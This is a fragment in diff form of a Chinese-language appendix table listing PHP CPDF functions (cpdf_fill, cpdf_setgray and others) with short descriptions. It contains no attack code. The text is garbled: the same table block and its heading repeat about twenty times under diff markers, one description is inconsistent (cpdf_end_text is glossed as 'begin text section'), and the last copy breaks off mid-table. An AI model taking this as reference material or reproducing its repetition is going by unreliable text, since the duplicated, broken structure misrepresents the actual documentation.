 | cpdf_setflat | CPDF | 设置平直度 |
+
 | cpdf_setgray | CPDF | 将绘图和填充颜色设置为灰度值 |
+
 | cpdf_setgray_fill | CPDF | 将填充颜色设置为灰度值 |
+
 | cpdf_setgray_stroke | CPDF | 将绘图颜色设置为灰度值 |
+
 | cpdf_setlinecap | CPDF | 设置线端参数 |
+
 | cpdf_setlinejoin | CPDF | 设置线连接参数 |
-
-## 表 D.1 按照字母顺序排列的 PHP 函数（续）
-
-| 函数名 | 分组名称 | 描述 |
-| :--- | :--- | :--- |
-| cpdf_end_text | CPDF | 开始文本段 |
-| cpdf_fill | CPDF | 填充当前路径 |
-| cpdf_fill_stroke | CPDF | 填充并描边当前路径 |
-| cpdf_finalize | CPDF | 结束文档 |
-| cpdf_finalize_page | CPDF | 结束页 |
-| cpdf_import_jpeg | CPDF | 打开 JPEG 图像 |
-| cpdf_lineto | CPDF | 绘制线 |
-| cpdf_moveto | CPDF | 设置当前点 |
-| cpdf_open | CPDF | 打开新的 pdf 文档 |
-| cpdf_output_buffer | CPDF | 输出内存中的 pdf 文档 |
-| cpdf_page_init | CPDF | 开始新页 |
-| cpdf_place_inline_image | CPDF | 在页面上放置图像 |
-| cpdf_rect | CPDF | 绘制矩形 |
-| cpdf_restore | CPDF | 恢复以前保存的环境 |
-| cpdf_rlineto | CPDF | 绘制线 |
-| cpdf_rmoveto | CPDF | 设置当前点 |
-| cpdf_rotate | CPDF | 设置旋转 |
-| cpdf_save | CPDF | 设置当前环境 |
-| cpdf_save_to_file | CPDF | 将 pdf 文档写入文件 |
-| cpdf_scale | CPDF | 设置缩放 |
-| cpdf_setdash | CPDF | 设置虚线模式 |
-| cpdf_setflat | CPDF | 设置平直度 |
-| cpdf_setgray | CPDF | 将绘图和填充颜色设置为灰度值 |
-| cpdf_setgray_fill | CPDF | 将填充颜色设置为灰度值 |
-| cpdf_setgray_stroke | CPDF | 将绘图颜色设置为灰度值 |
-| cpdf_setlinecap | CPDF | 设置线端参数 |
-| cpdf_setlinejoin | CPDF | 设置线连接参数 |
-
-## 表 D.1 按照字母顺序排列的 PHP 函数（续）
-
-| 函数名 | 分组名称 | 描述 |
-| :--- | :--- | :--- |
-| cpdf_end_text | CPDF | 开始文本段 |
-| cpdf_fill | CPDF | 填充当前路径 |
-| cpdf_fill_stroke | CPDF | 填充并描边当前路径 |
-| cpdf_finalize | CPDF | 结束文档 |
-| cpdf_finalize_page | CPDF | 结束页 |
-| cpdf_import_jpeg | CPDF | 打开 JPEG 图像 |
-| cpdf_lineto | CPDF | 绘制线 |
-| cpdf_moveto | CPDF | 设置当前点 |
-| cpdf_open | CPDF | 打开新的 pdf 文档 |
-| cpdf_output_buffer | CPDF | 输出内存中的 pdf 文档 |
-| cpdf_page_init | CPDF | 开始新页 |
-| cpdf_place_inline_image | CPDF | 在页面上放置图像 |
-| cpdf_rect | CPDF | 绘制矩形 |
-| cpdf_restore | CPDF | 恢复以前保存的环境 |
-| cpdf_rlineto | CPDF | 绘制线 |
-| cpdf_rmoveto | CPDF | 设置当前点 |
-| cpdf_rotate | CPDF | 设置旋转 |
-| cpdf_save | CPDF | 设置当前环境 |
-| cpdf_save_to_file | CPDF | 将 pdf 文档写入文件 |
-| cpdf_scale | CPDF | 设置缩放 |
-| cpdf_setdash | CPDF | 设置虚线模式 |
-| cpdf_setflat | CPDF | 设置平直度 |
-| cpdf_setgray | CPDF | 将绘图和填充颜色设置为灰度值 |
-| cpdf_setgray_fill | CPDF | 将填充颜色设置为灰度值 |
-| cpdf_setgray_stroke | CPDF | 将绘图颜色设置为灰度值 |
-| cpdf_setlinecap | CPDF | 设置线端参数 |
-| cpdf_setlinejoin | CPDF | 设置线连接参数 |
-
-## 表 D.1 按照字母顺序排列的 PHP 函数（续）
-
-| 函数名 | 分组名称 | 描述 |
-| :--- | :--- | :--- |
-| cpdf_end_text | CPDF | 开始文本段 |
-| cpdf_fill | CPDF | 填充当前路径 |
-| cpdf_fill_stroke | CPDF | 填充并描边当前路径 |
-| cpdf_finalize | CPDF | 结束文档 |
-| cpdf_finalize_page | CPDF | 结束页 |
-| cpdf_import_jpeg | CPDF | 打开 JPEG 图像 |
-| cpdf_lineto | CPDF | 绘制线 |
-| cpdf_moveto | CPDF | 设置当前点 |
-| cpdf_open | CPDF | 打开新的 pdf 文档 |
-| cpdf_output_buffer | CPDF | 输出内存中的 pdf 文档 |
-| cpdf_page_init | CPDF | 开始新页 |
-| cpdf_place_inline_image | CPDF | 在页面上放置图像 |
-| cpdf_rect | CPDF | 绘制矩形 |
-| cpdf_restore | CPDF | 恢复以前保存的环境 |
-| cpdf_rlineto | CPDF | 绘制线 |
-| cpdf_rmoveto | CPDF | 设置当前点 |
-| cpdf_rotate | CPDF | 设置旋转 |
-| cpdf_save | CPDF | 设置当前环境 |
-| cpdf_save_to_file | CPDF | 将 pdf 文档写入文件 |
-| cpdf_scale | CPDF | 设置缩放 |
-| cpdf_setdash | CPDF | 设置虚线模式 |
-| cpdf_setflat | CPDF | 设置平直度 |
-| cpdf_setgray | CPDF | 将绘图和填充颜色设置为灰度值 |
-| cpdf_setgray_fill | CPDF | 将填充颜色设置为灰度值 |
-| cpdf_setgray_stroke | CPDF | 将绘图颜色设置为灰度值 |
-| cpdf_setlinecap | CPDF | 设置线端参数 |
-| cpdf_setlinejoin | CPDF | 设置线连接参数 |
-
-## 表 D.1 按照字母顺序排列的 PHP 函数（续）
-
-| 函数名 | 分组名称 | 描述 |
-| :--- | :--- | :--- |
-| cpdf_end_text | CPDF | 开始文本段 |
-| cpdf_fill | CPDF | 填充当前路径 |
-| cpdf_fill_stroke | CPDF | 填充并描边当前路径 |
-| cpdf_finalize | CPDF | 结束文档 |
-| cpdf_finalize_page | CPDF | 结束页 |
-| cpdf_import_jpeg | CPDF | 打开 JPEG 图像 |
-| cpdf_lineto | CPDF | 绘制线 |
-| cpdf_moveto | CPDF | 设置当前点 |
-| cpdf_open | CPDF | 打开新的 pdf 文档 |
-| cpdf_output_buffer | CPDF | 输出内存中的 pdf 文档 |
-| cpdf_page_init | CPDF | 开始新页 |
-| cpdf_place_inline_image | CPDF | 在页面上放置图像 |
-| cpdf_rect | CPDF | 绘制矩形 |
-| cpdf_restore | CPDF | 恢复以前保存的环境 |
-| cpdf_rlineto | CPDF | 绘制线 |
-| cpdf_rmoveto | CPDF | 设置当前点 |
-| cpdf_rotate | CPDF | 设置旋转 |
-| cpdf_save | CPDF | 设置当前环境 |
-| cpdf_save_to_file | CPDF | 将 pdf 文档写入文件 |
-| cpdf_scale | CPDF | 设置缩放 |
-| cpdf_setdash | CPDF | 设置虚线模式 |
-| cpdf_setflat | CPDF | 设置平直度 |
-| cpdf_setgray | CPDF | 将绘图和填充颜色设置为灰度值 |
-| cpdf_setgray_fill | CPDF | 将填充颜色设置为灰度值 |
-| cpdf_setgray_stroke | CPDF | 将绘图颜色设置为灰度值 |
-| cpdf_setlinecap | CPDF | 设置线端参数 |
-| cpdf_setlinejoin | CPDF | 设置线连接参数 |
-
-## 表 D.1 按照字母顺序排列的 PHP 函数（续）
-
-| 函数名 | 分组名称 | 描述 |
-| :--- | :--- | :--- |
-| cpdf_end_text | CPDF | 开始文本段 |
-| cpdf_fill | CPDF | 填充当前路径 |
-| cpdf_fill_stroke | CPDF | 填充并描边当前路径 |
-| cpdf_finalize | CPDF | 结束文档 |
-| cpdf_finalize_page | CPDF | 结束页 |
-| cpdf_import_jpeg | CPDF | 打开 JPEG 图像 |
-| cpdf_lineto | CPDF | 绘制线 |
-| cpdf_moveto | CPDF | 设置当前点 |
-| cpdf_open | CPDF | 打开新的 pdf 文档 |
-| cpdf_output_buffer | CPDF | 输出内存中的 pdf 文档 |
-| cpdf_page_init | CPDF | 开始新页 |
-| cpdf_place_inline_image | CPDF | 在页面上放置图像 |
-| cpdf_rect | CPDF | 绘制矩形 |
-| cpdf_restore | CPDF | 恢复以前保存的环境 |
-| cpdf_rlineto | CPDF | 绘制线 |
-| cpdf_rmoveto | CPDF | 设置当前点 |
-| cpdf_rotate | CPDF | 设置旋转 |
-| cpdf_save | CPDF | 设置当前环境 |
-| cpdf_save_to_file | CPDF | 将 pdf 文档写入文件 |
-| cpdf_scale | CPDF | 设置缩放 |
-| cpdf_setdash | CPDF | 设置虚线模式 |
-| cpdf_setflat | CPDF | 设置平直度 |
-| cpdf_setgray | CPDF | 将绘图和填充颜色设置为灰度值 |
-| cpdf_setgray_fill | CPDF | 将填充颜色设置为灰度值 |
-| cpdf_setgray_stroke | CPDF | 将绘图颜色设置为灰度值 |
-| cpdf_setlinecap | CPDF | 设置线端参数 |
-| cpdf_setlinejoin | CPDF | 设置线连接参数 |
-
-## 表 D.1 按照字母顺序排列的 PHP 函数（续）
-
-| 函数名 | 分组名称 | 描述 |
-| :--- | :--- | :--- |
-| cpdf_end_text | CPDF | 开始文本段 |
-| cpdf_fill | CPDF | 填充当前路径 |
-| cpdf_fill_stroke | CPDF | 填充并描边当前路径 |
-| cpdf_finalize | CPDF | 结束文档 |
-| cpdf_finalize_page | CPDF | 结束页 |
-| cpdf_import_jpeg | CPDF | 打开 JPEG 图像 |
-| cpdf_lineto | CPDF | 绘制线 |
-| cpdf_moveto | CPDF | 设置当前点 |
-| cpdf_open | CPDF | 打开新的 pdf 文档 |
-| cpdf_output_buffer | CPDF | 输出内存中的 pdf 文档 |
-| cpdf_page_init | CPDF | 开始新页 |
-| cpdf_place_inline_image | CPDF | 在页面上放置图像 |
-| cpdf_rect | CPDF | 绘制矩形 |
-| cpdf_restore | CPDF | 恢复以前保存的环境 |
-| cpdf_rlineto | CPDF | 绘制线 |
-| cpdf_rmoveto | CPDF | 设置当前点 |
-| cpdf_rotate | CPDF | 设置旋转 |
-| cpdf_save | CPDF | 设置当前环境 |
-| cpdf_save_to_file | CPDF | 将 pdf 文档写入文件 |
-| cpdf_scale | CPDF | 设置缩放 |
-| cpdf_setdash | CPDF | 设置虚线模式 |
-| cpdf_setflat | CPDF | 设置平直度 |
-| cpdf_setgray | CPDF | 将绘图和填充颜色设置为灰度值 |
-| cpdf_setgray_fill | CPDF | 将填充颜色设置为灰度值 |
-| cpdf_setgray_stroke | CPDF | 将绘图颜色设置为灰度值 |
-| cpdf_setlinecap | CPDF | 设置线端参数 |
-| cpdf_setlinejoin | CPDF | 设置线连接参数 |
-
-## 表 D.1 按照字母顺序排列的 PHP 函数（续）
-
-| 函数名 | 分组名称 | 描述 |
-| :--- | :--- | :--- |
-| cpdf_end_text | CPDF | 开始文本段 |
-| cpdf_fill | CPDF | 填充当前路径 |
-| cpdf_fill_stroke | CPDF | 填充并描边当前路径 |
-| cpdf_finalize | CPDF | 结束文档 |
-| cpdf_finalize_page | CPDF | 结束页 |
-| cpdf_import_jpeg | CPDF | 打开 JPEG 图像 |
-| cpdf_lineto | CPDF | 绘制线 |
-| cpdf_moveto | CPDF | 设置当前点 |
-| cpdf_open | CPDF | 打开新的 pdf 文档 |
-| cpdf_output_buffer | CPDF | 输出内存中的 pdf 文档 |
-| cpdf_page_init | CPDF | 开始新页 |
-| cpdf_place_inline_image | CPDF | 在页面上放置图像 |
-| cpdf_rect | CPDF | 绘制矩形 |
-| cpdf_restore | CPDF | 恢复以前保存的环境 |
-| cpdf_rlineto | CPDF | 绘制线 |
-| cpdf_rmoveto | CPDF | 设置当前点 |
-| cpdf_rotate | CPDF | 设置旋转 |
-| cpdf_save | CPDF | 设置当前环境 |
-| cpdf_save_to_file | CPDF | 将 pdf 文档写入文件 |
-| cpdf_scale | CPDF | 设置缩放 |
-| cpdf_setdash | CPDF | 设置虚线模式 |
-| cpdf_setflat | CPDF | 设置平直度 |
-| cpdf_setgray | CPDF | 将绘图和填充颜色设置为灰度值 |
-| cpdf_setgray_fill | CPDF | 将填充颜色设置为灰度值 |
-| cpdf_setgray_stroke | CPDF | 将绘图颜色设置为灰度值 |
-| cpdf_setlinecap | CPDF | 设置线端参数 |
-| cpdf_setlinejoin | CPDF | 设置线连接参数 |
-
-## 表 D.1 按照字母顺序排列的 PHP 函数（续）
-
-| 函数名 | 分组名称 | 描述 |
-| :--- | :--- | :--- |
-| cpdf_end_text | CPDF | 开始文本段 |
-| cpdf_fill | CPDF | 填充当前路径 |
-| cpdf_fill_stroke | CPDF | 填充并描边当前路径 |
-| cpdf_finalize | CPDF | 结束文档 |
-| cpdf_finalize_page | CPDF | 结束页 |
-| cpdf_import_jpeg | CPDF | 打开 JPEG 图像 |
-| cpdf_lineto | CPDF | 绘制线 |
-| cpdf_moveto | CPDF | 设置当前点 |
-| cpdf_open | CPDF | 打开新的 pdf 文档 |
-| cpdf_output_buffer | CPDF | 输出内存中的 pdf 文档 |
-| cpdf_page_init | CPDF | 开始新页 |
-| cpdf_place_inline_image | CPDF | 在页面上放置图像 |
-| cpdf_rect | CPDF | 绘制矩形 |
-| cpdf_restore | CPDF | 恢复以前保存的环境 |
-| cpdf_rlineto | CPDF | 绘制线 |
-| cpdf_rmoveto | CPDF | 设置当前点 |
-| cpdf_rotate | CPDF | 设置旋转 |
-| cpdf_save | CPDF | 设置当前环境 |
-| cpdf_save_to_file | CPDF | 将 pdf 文档写入文件 |
-| cpdf_scale | CPDF | 设置缩放 |
-| cpdf_setdash | CPDF | 设置虚线模式 |
-| cpdf_setflat | CPDF | 设置平直度 |
-| cpdf_setgray | CPDF | 将绘图和填充颜色设置为灰度值 |
-| cpdf_setgray_fill | CPDF | 将填充颜色设置为灰度值 |
-| cpdf_setgray_stroke | CPDF | 将绘图颜色设置为灰度值 |
-| cpdf_setlinecap | CPDF | 设置线端参数 |
-| cpdf_setlinejoin | CPDF | 设置线连接参数 |
-
-## 表 D.1 按照字母顺序排列的 PHP 函数（续）
-
-| 函数名 | 分组名称 | 描述 |
-| :--- | :--- | :--- |
-| cpdf_end_text | CPDF | 开始文本段 |
-| cpdf_fill | CPDF | 填充当前路径 |
-| cpdf_fill_stroke | CPDF | 填充并描边当前路径 |
-| cpdf_finalize | CPDF | 结束文档 |
-| cpdf_finalize_page | CPDF | 结束页 |
-| cpdf_import_jpeg | CPDF | 打开 JPEG 图像 |
-| cpdf_lineto | CPDF | 绘制线 |
-| cpdf_moveto | CPDF | 设置当前点 |
-| cpdf_open | CPDF | 打开新的 pdf 文档 |
-| cpdf_output_buffer | CPDF | 输出内存中的 pdf 文档 |
-| cpdf_page_init | CPDF | 开始新页 |
-| cpdf_place_inline_image | CPDF | 在页面上放置图像 |
-| cpdf_rect | CPDF | 绘制矩形 |
-| cpdf_restore | CPDF | 恢复以前保存的环境 |
-| cpdf_rlineto | CPDF | 绘制线 |
-| cpdf_rmoveto | CPDF | 设置当前点 |
-| cpdf_rotate | CPDF | 设置旋转 |
-| cpdf_save | CPDF | 设置当前环境 |
-| cpdf_save_to_file | CPDF | 将 pdf 文档写入文件 |
-| cpdf_scale | CPDF | 设置缩放 |
-| cpdf_setdash | CPDF | 设置虚线模式 |
-| cpdf_setflat | CPDF | 设置平直度 |
-| cpdf_setgray | CPDF | 将绘图和填充颜色设置为灰度值 |
-| cpdf_setgray_fill | CPDF | 将填充颜色设置为灰度值 |
-| cpdf_setgray_stroke | CPDF | 将绘图颜色设置为灰度值 |
-| cpdf_setlinecap | CPDF | 设置线端参数 |
-| cpdf_setlinejoin | CPDF | 设置线连接参数 |
-
-## 表 D.1 按照字母顺序排列的 PHP 函数（续）
-
-| 函数名 | 分组名称 | 描述 |
-| :--- | :--- | :--- |
-| cpdf_end_text | CPDF | 开始文本段 |
-| cpdf_fill | CPDF | 填充当前路径 |
-| cpdf_fill_stroke | CPDF | 填充并描边当前路径 |
-| cpdf_finalize | CPDF | 结束文档 |
-| cpdf_finalize_page | CPDF | 结束页 |
-| cpdf_import_jpeg | CPDF | 打开 JPEG 图像 |
-| cpdf_lineto | CPDF | 绘制线 |
-| cpdf_moveto | CPDF | 设置当前点 |
-| cpdf_open | CPDF | 打开新的 pdf 文档 |
-| cpdf_output_buffer | CPDF | 输出内存中的 pdf 文档 |
-| cpdf_page_init | CPDF | 开始新页 |
-| cpdf_place_inline_image | CPDF | 在页面上放置图像 |
-| cpdf_rect | CPDF | 绘制矩形 |
-| cpdf_restore | CPDF | 恢复以前保存的环境 |
-| cpdf_rlineto | CPDF | 绘制线 |
-| cpdf_rmoveto | CPDF | 设置当前点 |
-| cpdf_rotate | CPDF | 设置旋转 |
-| cpdf_save | CPDF | 设置当前环境 |
-| cpdf_save_to_file | CPDF | 将 pdf 文档写入文件 |
-| cpdf_scale | CPDF | 设置缩放 |
-| cpdf_setdash | CPDF | 设置虚线模式 |
-| cpdf_setflat | CPDF | 设置平直度 |
-| cpdf_setgray | CPDF | 将绘图和填充颜色设置为灰度值 |
-| cpdf_setgray_fill | CPDF | 将填充颜色设置为灰度值 |
-| cpdf_setgray_stroke | CPDF | 将绘图颜色设置为灰度值 |
-| cpdf_setlinecap | CPDF | 设置线端参数 |
-| cpdf_setlinejoin | CPDF | 设置线连接参数 |
-
-## 表 D.1 按照字母顺序排列的 PHP 函数（续）
-
-| 函数名 | 分组名称 | 描述 |
-| :--- | :--- | :--- |
-| cpdf_end_text | CPDF | 开始文本段 |
-| cpdf_fill | CPDF | 填充当前路径 |
-| cpdf_fill_stroke | CPDF | 填充并描边当前路径 |
-| cpdf_finalize | CPDF | 结束文档 |
-| cpdf_finalize_page | CPDF | 结束页 |
-| cpdf_import_jpeg | CPDF | 打开 JPEG 图像 |
-| cpdf_lineto | CPDF | 绘制线 |
-| cpdf_moveto | CPDF | 设置当前点 |
-| cpdf_open | CPDF | 打开新的 pdf 文档 |
-| cpdf_output_buffer | CPDF | 输出内存中的 pdf 文档 |
-| cpdf_page_init | CPDF | 开始新页 |
-| cpdf_place_inline_image | CPDF | 在页面上放置图像 |
-| cpdf_rect | CPDF | 绘制矩形 |
-| cpdf_restore | CPDF | 恢复以前保存的环境 |
-| cpdf_rlineto | CPDF | 绘制线 |
-| cpdf_rmoveto | CPDF | 设置当前点 |
-| cpdf_rotate | CPDF | 设置旋转 |
-| cpdf_save | CPDF | 设置当前环境 |
-| cpdf_save_to_file | CPDF | 将 pdf 文档写入文件 |
-| cpdf_scale | CPDF | 设置缩放 |
-| cpdf_setdash | CPDF | 设置虚线模式 |
-| cpdf_setflat | CPDF | 设置平直度 |
-| cpdf_setgray | CPDF | 将绘图和填充颜色设置为灰度值 |
-| cpdf_setgray_fill | CPDF | 将填充颜色设置为灰度值 |
-| cpdf_setgray_stroke | CPDF | 将绘图颜色设置为灰度值 |
-| cpdf_setlinecap | CPDF | 设置线端参数 |
-| cpdf_setlinejoin | CPDF | 设置线连接参数 |
-
-## 表 D.1 按照字母顺序排列的 PHP 函数（续）
-
-| 函数名 | 分组名称 | 描述 |
-| :--- | :--- | :--- |
-| cpdf_end_text | CPDF | 开始文本段 |
-| cpdf_fill | CPDF | 填充当前路径 |
-| cpdf_fill_stroke | CPDF | 填充并描边当前路径 |
-| cpdf_finalize | CPDF | 结束文档 |
-| cpdf_finalize_page | CPDF | 结束页 |
-| cpdf_import_jpeg | CPDF | 打开 JPEG 图像 |
-| cpdf_lineto | CPDF | 绘制线 |
-| cpdf_moveto | CPDF | 设置当前点 |
-| cpdf_open | CPDF | 打开新的 pdf 文档 |
-| cpdf_output_buffer | CPDF | 输出内存中的 pdf 文档 |
-| cpdf_page_init | CPDF | 开始新页 |
-| cpdf_place_inline_image | CPDF | 在页面上放置图像 |
-| cpdf_rect | CPDF | 绘制矩形 |
-| cpdf_restore | CPDF | 恢复以前保存的环境 |
-| cpdf_rlineto | CPDF | 绘制线 |
-| cpdf_rmoveto | CPDF | 设置当前点 |
-| cpdf_rotate | CPDF | 设置旋转 |
-| cpdf_save | CPDF | 设置当前环境 |
-| cpdf_save_to_file | CPDF | 将 pdf 文档写入文件 |
-| cpdf_scale | CPDF | 设置缩放 |
-| cpdf_setdash | CPDF | 设置虚线模式 |
-| cpdf_setflat | CPDF | 设置平直度 |
-| cpdf_setgray | CPDF | 将绘图和填充颜色设置为灰度值 |
-| cpdf_setgray_fill | CPDF | 将填充颜色设置为灰度值 |
-| cpdf_setgray_stroke | CPDF | 将绘图颜色设置为灰度值 |
-| cpdf_setlinecap | CPDF | 设置线端参数 |
-| cpdf_setlinejoin | CPDF | 设置线连接参数 |
-
-## 表 D.1 按照字母顺序排列的 PHP 函数（续）
-
-| 函数名 | 分组名称 | 描述 |
-| :--- | :--- | :--- |
-| cpdf_end_text | CPDF | 开始文本段 |
-| cpdf_fill | CPDF | 填充当前路径 |
-| cpdf_fill_stroke | CPDF | 填充并描边当前路径 |
-| cpdf_finalize | CPDF | 结束文档 |
-| cpdf_finalize_page | CPDF | 结束页 |
-| cpdf_import_jpeg | CPDF | 打开 JPEG 图像 |
-| cpdf_lineto | CPDF | 绘制线 |
-| cpdf_moveto | CPDF | 设置当前点 |
-| cpdf_open | CPDF | 打开新的 pdf 文档 |
-| cpdf_output_buffer | CPDF | 输出内存中的 pdf 文档 |
-| cpdf_page_init | CPDF | 开始新页 |
-| cpdf_place_inline_image | CPDF | 在页面上放置图像 |
-| cpdf_rect | CPDF | 绘制矩形 |
-| cpdf_restore | CPDF | 恢复以前保存的环境 |
-| cpdf_rlineto | CPDF | 绘制线 |
-| cpdf_rmoveto | CPDF | 设置当前点 |
-| cpdf_rotate | CPDF | 设置旋转 |
-| cpdf_save | CPDF | 设置当前环境 |
-| cpdf_save_to_file | CPDF | 将 pdf 文档写入文件 |
-| cpdf_scale | CPDF | 设置缩放 |
-| cpdf_setdash | CPDF | 设置虚线模式 |
-| cpdf_setflat | CPDF | 设置平直度 |
-| cpdf_setgray | CPDF | 将绘图和填充颜色设置为灰度值 |
-| cpdf_setgray_fill | CPDF | 将填充颜色设置为灰度值 |
-| cpdf_setgray_stroke | CPDF | 将绘图颜色设置为灰度值 |
-| cpdf_setlinecap | CPDF | 设置线端参数 |
-| cpdf_setlinejoin | CPDF | 设置线连接参数 |
-
-## 表 D.1 按照字母顺序排列的 PHP 函数（续）
-
-| 函数名 | 分组名称 | 描述 |
-| :--- | :--- | :--- |
-| cpdf_end_text | CPDF | 开始文本段 |
-| cpdf_fill | CPDF | 填充当前路径 |
-| cpdf_fill_stroke | CPDF | 填充并描边当前路径 |
-| cpdf_finalize | CPDF | 结束文档 |
-| cpdf_finalize_page | CPDF | 结束页 |
-| cpdf_import_jpeg | CPDF | 打开 JPEG 图像 |
-| cpdf_lineto | CPDF | 绘制线 |
-| cpdf_moveto | CPDF | 设置当前点 |
-| cpdf_open | CPDF | 打开新的 pdf 文档 |
-| cpdf_output_buffer | CPDF | 输出内存中的 pdf 文档 |
-| cpdf_page_init | CPDF | 开始新页 |
-| cpdf_place_inline_image | CPDF | 在页面上放置图像 |
-| cpdf_rect | CPDF | 绘制矩形 |
-| cpdf_restore | CPDF | 恢复以前保存的环境 |
-| cpdf_rlineto | CPDF | 绘制线 |
-| cpdf_rmoveto | CPDF | 设置当前点 |
-| cpdf_rotate | CPDF | 设置旋转 |
-| cpdf_save | CPDF | 设置当前环境 |
-| cpdf_save_to_file | CPDF | 将 pdf 文档写入文件 |
-| cpdf_scale | CPDF | 设置缩放 |
-| cpdf_setdash | CPDF | 设置虚线模式 |
-| cpdf_setflat | CPDF | 设置平直度 |
-| cpdf_setgray | CPDF | 将绘图和填充颜色设置为灰度值 |
-| cpdf_setgray_fill | CPDF | 将填充颜色设置为灰度值 |
-| cpdf_setgray_stroke | CPDF | 将绘图颜色设置为灰度值 |
-| cpdf_setlinecap | CPDF | 设置线端参数 |
-| cpdf_setlinejoin | CPDF | 设置线连接参数 |
-
-## 表 D.1 按照字母顺序排列的 PHP 函数（续）
-
-| 函数名 | 分组名称 | 描述 |
-| :--- | :--- | :--- |
-| cpdf_end_text | CPDF | 开始文本段 |
-| cpdf_fill | CPDF | 填充当前路径 |
-| cpdf_fill_stroke | CPDF | 填充并描边当前路径 |
-| cpdf_finalize | CPDF | 结束文档 |
-| cpdf_finalize_page | CPDF | 结束页 |
-| cpdf_import_jpeg | CPDF | 打开 JPEG 图像 |
-| cpdf_lineto | CPDF | 绘制线 |
-| cpdf_moveto | CPDF | 设置当前点 |
-| cpdf_open | CPDF | 打开新的 pdf 文档 |
-| cpdf_output_buffer | CPDF | 输出内存中的 pdf 文档 |
-| cpdf_page_init | CPDF | 开始新页 |
-| cpdf_place_inline_image | CPDF | 在页面上放置图像 |
-| cpdf_rect | CPDF | 绘制矩形 |
-| cpdf_restore | CPDF | 恢复以前保存的环境 |
-| cpdf_rlineto | CPDF | 绘制线 |
-| cpdf_rmoveto | CPDF | 设置当前点 |
-| cpdf_rotate | CPDF | 设置旋转 |
-| cpdf_save | CPDF | 设置当前环境 |
-| cpdf_save_to_file | CPDF | 将 pdf 文档写入文件 |
-| cpdf_scale | CPDF | 设置缩放 |
-| cpdf_setdash | CPDF | 设置虚线模式 |
-| cpdf_setflat | CPDF | 设置平直度 |
-| cpdf_setgray | CPDF | 将绘图和填充颜色设置为灰度值 |
-| cpdf_setgray_fill | CPDF | 将填充颜色设置为灰度值 |
-| cpdf_setgray_stroke | CPDF | 将绘图颜色设置为灰度值 |
-| cpdf_setlinecap | CPDF | 设置线端参数 |
-| cpdf_setlinejoin | CPDF | 设置线连接参数 |
-
-## 表 D.1 按照字母顺序排列的 PHP 函数（续）
-
-| 函数名 | 分组名称 | 描述 |
-| :--- | :--- | :--- |
-| cpdf_end_text | CPDF | 开始文本段 |
-| cpdf_fill | CPDF | 填充当前路径 |
-| cpdf_fill_stroke | CPDF | 填充并描边当前路径 |
-| cpdf_finalize | CPDF | 结束文档 |
-| cpdf_finalize_page | CPDF | 结束页 |
-| cpdf_import_jpeg | CPDF | 打开 JPEG 图像 |
-| cpdf_lineto | CPDF | 绘制线 |
-| cpdf_moveto | CPDF | 设置当前点 |
-| cpdf_open | CPDF | 打开新的 pdf 文档 |
-| cpdf_output_buffer | CPDF | 输出内存中的 pdf 文档 |
-| cpdf_page_init | CPDF | 开始新页 |
-| cpdf_place_inline_image | CPDF | 在页面上放置图像 |
-| cpdf_rect | CPDF | 绘制矩形 |
-| cpdf_restore | CPDF | 恢复以前保存的环境 |
-| cpdf_rlineto | CPDF | 绘制线 |
-| cpdf_rmoveto | CPDF | 设置当前点 |
-| cpdf_rotate | CPDF | 设置旋转 |
-| cpdf_save | CPDF | 设置当前环境 |
-| cpdf_save_to_file | CPDF | 将 pdf 文档写入文件 |
-| cpdf_scale | CPDF | 设置缩放 |
-| cpdf_setdash | CPDF | 设置虚线模式 |
-| cpdf_setflat | CPDF | 设置平直度 |
-| cpdf_setgray | CPDF | 将绘图和填充颜色设置为灰度值 |
-| cpdf_setgray_fill | CPDF | 将填充颜色设置为灰度值 |
-| cpdf_setgray_stroke | CPDF | 将绘图颜色设置为灰度值 |
-| cpdf_setlinecap | CPDF | 设置线端参数 |
-| cpdf_setlinejoin | CPDF | 设置线连接参数 |
-
-## 表 D.1 按照字母顺序排列的 PHP 函数（续）
-
-| 函数名 | 分组名称 | 描述 |
-| :--- | :--- | :--- |
-| cpdf_end_text | CPDF | 开始文本段 |
-| cpdf_fill | CPDF | 填充当前路径 |
-| cpdf_fill_stroke | CPDF | 填充并描边当前路径 |
-| cpdf_finalize | CPDF | 结束文档 |
-| cpdf_finalize_page | CPDF | 结束页 |
-| cpdf_import_jpeg | CPDF | 打开 JPEG 图像 |
-| cpdf_lineto | CPDF | 绘制线 |
-| cpdf_moveto | CPDF | 设置当前点 |
-| cpdf_open | CPDF | 打开新的 pdf 文档 |
-| cpdf_output_buffer | CPDF | 输出内存中的 pdf 文档 |
-| cpdf_page_init | CPDF | 开始新页 |
-| cpdf_place_inline_image | CPDF | 在页面上放置图像 |
-| cpdf_rect | CPDF | 绘制矩形 |
-| cpdf_restore | CPDF | 恢复以前保存的环境 |
-| cpdf_rlineto | CPDF | 绘制线 |
-| cpdf_rmoveto | CPDF | 设置当前点 |
-| cpdf_rotate | CPDF | 设置旋转 |
-| cpdf_save | CPDF | 设置当前环境 |
-| cpdf_save_to_file | CPDF | 将 pdf 文档写入文件 |
-| cpdf_scale | CPDF | 设置缩放 |
-| cpdf_setdash | CPDF | 设置虚线模式 |
-| cpdf_setflat | CPDF | 设置平直度 |
-| cpdf_setgray | CPDF | 将绘图和填充颜色设置为灰度值 |
-| cpdf_setgray_fill | CPDF | 将填充颜色设置为灰度值 |
-| cpdf_setgray_stroke | CPDF | 将绘图颜色设置为灰度值 |
-| cpdf_setlinecap | CPDF | 设置线端参数 |
-| cpdf_setlinejoin | CPDF | 设置线连接参数 |
-
-## 表 D.1 按照字母顺序排列的 PHP 函数（续）
-
-| 函数名 | 分组名称 | 描述 |
-| :--- | :--- | :--- |
-| cpdf_end_text | CPDF | 开始文本段 |
-| cpdf_fill | CPDF | 填充当前路径 |
-| cpdf_fill_stroke | CPDF | 填充并描边当前路径 |
-| cpdf_finalize | CPDF | 结束文档 |
-| cpdf_finalize_page | CPDF | 结束页 |
-| cpdf_import_jpeg | CPDF | 打开 JPEG 图像 |
-| cpdf_lineto | CPDF | 绘制线 |
-| cpdf_moveto | CPDF | 设置当前点 |
-| cpdf_open | CPDF | 打开新的 pdf 文档 |
-| cpdf_output_buffer | CPDF | 输出内存中的 pdf 文档 |
-| cpdf_page_init | CPDF | 开始新页 |
-| cpdf_place_inline_image | CPDF | 在页面上放置图像 |
-| cpdf_rect | CPDF | 绘制矩形 |
-| cpdf_restore | CPDF | 恢复以前保存的环境 |
-| cpdf_rlineto | CPDF | 绘制线 |
-| cpdf_rmoveto | CPDF | 设置当前点 |
-| cpdf_rotate | CPDF | 设置旋转 |
-| cpdf_save | CPDF | 设置当前环境 |
